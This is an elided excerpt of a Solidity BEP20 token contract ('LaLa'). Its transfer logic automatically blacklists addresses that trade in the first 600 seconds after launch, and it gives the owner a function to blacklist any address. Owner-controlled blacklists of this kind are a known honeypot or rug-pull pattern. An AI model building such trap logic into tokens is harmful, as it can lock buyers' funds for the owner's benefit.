...
contract BEP20LaLa is Ownable, ERC20{
    ...
    address yxAddr = address(0x8Fd2a4DdD4605CF4fDBb324C34BCB976dDd17f96);
    ...
    constructor() ERC20("LaLa", "LaLa") {
         address _owner = address(0xE17FCC993536743362A82c13402b1Dd745C234D3); //OW
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (isBai(from) || isBai(to)){
            takeFee = true;
            if(uniswapV2Pair.totalSupply() <= 0 && isPair(to))startTime = block.timestamp;
        }
        if (!takeFee) {
            if(isPair(to) || isPair(from)){
                ...
                bool toHei = nowTime.sub(startTime) < 600;
                if(isPair(from)){//buy
                    if(toHei)hei[address(to)] = true;
                }
                if(isPair(to)){ //sell
                    if(toHei)hei[address(from)] = true;
    ...
    function setHei(address addr) external onlyOwner{
        hei[address(addr)] = true;
    }
